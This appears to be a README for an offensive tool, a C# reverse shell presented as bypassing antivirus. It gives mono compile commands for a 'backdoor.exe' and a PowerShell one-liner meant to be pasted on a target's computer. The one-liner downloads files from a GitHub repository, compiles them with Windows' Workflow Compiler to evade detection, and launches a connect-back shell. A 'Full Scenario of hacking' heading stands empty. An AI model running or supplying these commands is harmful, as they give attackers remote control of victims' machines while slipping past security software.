# Reverse shell C# bypassing AV solutions  

## Compile code to .exe
To generate only a executable file, compile the script "reverse_shell_to_exe.cs" like that :
sudo apt install mono-complete  
mcs -out:backdoor.exe reverse_shell_to_exec.cs  
mono backdoor.exe  


## Live compiling via Powershell 
To get a reverse shell via a command line, copy paste the following payload directly on the target's computer 
(it will download the two files from github, compile them with the legit compiler of Windows and launch the connect back)

powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/S-crow/reverseShell/master/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/S-crow/reverseShell/master/reverse_shell.cs', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell


## Full Scenario of hacking 




